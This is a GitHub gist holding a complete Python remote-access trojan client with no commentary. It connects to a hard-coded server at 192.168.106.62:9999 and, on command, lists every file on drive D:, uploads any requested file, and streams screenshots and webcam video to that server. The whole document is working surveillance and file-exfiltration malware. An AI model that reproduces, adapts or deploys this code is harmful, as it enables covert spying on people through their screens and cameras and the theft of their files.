#date: 2025-05-27T16:53:32Z
#url: https://api.github.com/gists/8afb6e55874e591a3ca7daf4811b1f2a
#owner: https://api.github.com/users/darkldarkl384

import socket
import os
import threading
import pyautogui
import cv2
import json
import struct
import io

SERVER_IP = ('192.168.106.62')
SERVER_PORT = 9999

def list_files():
    all_files = []
    for root, dirs, files in os.walk("D:\\"):
        for file in files:
            all_files.append(os.path.join(root, file))
    return all_files

def send_file(sock, path):
    try:
        with open(path, "rb") as f:
            
            data = f.read()
        sock.sendall(struct.pack("<Q", len(data)))
        sock.sendall(data)
    except:
        sock.sendall(struct.pack("<Q", 0))

def screen_stream(sock, stop_flag):
    while not stop_flag.is_set():
        img = pyautogui.screenshot()
        with io.BytesIO() as output:
            img.save(output, format="JPEG")
            data = output.getvalue()
        sock.sendall(struct.pack("<Q", len(data)))
        sock.sendall(data)

def camera_stream(sock, stop_flag):
    cap = cv2.VideoCapture(0)
    while not stop_flag.is_set():
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        data = buffer.tobytes()
        sock.sendall(struct.pack("<Q", len(data)))
        sock.sendall(data)
    cap.release()

def handle_server(sock):
    screen_flag = threading.Event()
    cam_flag = threading.Event()
    while True:
        cmd = sock.recv(1024).decode()
        if cmd == "LIST":
            files = list_files()
            sock.send(json.dumps(files).encode())
            sock.recv(2)
        elif cmd.startswith("GET "):
            _, path = cmd.split(" ", 1)
            send_file(sock, path)
        elif cmd == "SCREEN":
            screen_flag.clear()
            threading.Thread(target=screen_stream, args=(sock, screen_flag), daemon=True).start()
        elif cmd == "CAM":
            cam_flag.clear()
            threading.Thread(target=camera_stream, args=(sock, cam_flag), daemon=True).start()
        elif cmd == "STOP_SCREEN":
            screen_flag.set()
        elif cmd == "STOP_CAM":
            cam_flag.set()

if __name__ == "__main__":
    s = socket.socket()
    s.connect((SERVER_IP, SERVER_PORT))
    handle_server(s)